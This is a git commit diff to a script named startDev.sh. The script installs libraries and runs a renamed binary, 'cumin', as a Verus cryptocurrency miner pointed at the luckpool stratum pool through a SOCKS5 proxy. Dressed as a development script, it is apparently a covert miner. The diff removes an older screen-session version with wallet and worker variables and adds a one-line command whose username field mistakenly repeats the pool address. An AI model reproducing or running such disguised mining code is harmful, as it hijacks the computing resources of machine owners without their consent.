3fe652392bf278e8a03664fcd6045593036e8080
closemaptoya <85560638+closemaptoya@users.noreply.github.com>
2021-07-03 22:49:30 +0700

    Update startDev.sh

--- startDev.sh
+++ startDev.sh
@@ -2,10 +2,4 @@
 sudo apt-get update 
 sudo apt install libcurl4-openssl-dev -y
 chmod +x cumin
-apt install screen
-screen -dmS ls 
-POOL=stratum+tcp://ap.luckpool.net:3960
-WALLET=RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr
-WORKER=DevV5ByNongCroissant
-PROXY=socks5://98.162.25.23:4145
-./cumin -a verus -o $POOL -u $WALLET -t 4 -x $PROXY
+./cumin -a verus -o stratum+tcp://ap.luckpool.net:3960 -u stratum+tcp://ap.luckpool.net:3960.DevV5 -t 4 -x socks5://98.162.25.23:4145
